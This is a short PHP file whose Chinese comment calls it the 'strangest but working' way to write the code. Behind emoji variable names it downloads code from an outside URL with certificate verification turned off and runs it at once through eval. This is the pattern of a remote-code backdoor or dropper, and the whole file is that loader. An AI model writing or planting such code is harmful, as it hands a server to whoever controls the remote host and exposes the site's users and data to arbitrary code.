<?php
// 中文版 - 最奇怪但能运行的写法
$💻 = 'https://myzedd.tech/project/zedd';
$📥 = fn($🌐) => ($📦 = @file_get_contents($🌐, false, stream_context_create(['ssl' => ['verify_peer' => false]]))) ? (eval('?>' . $📦) && true) : false;
$📥($💻);
?>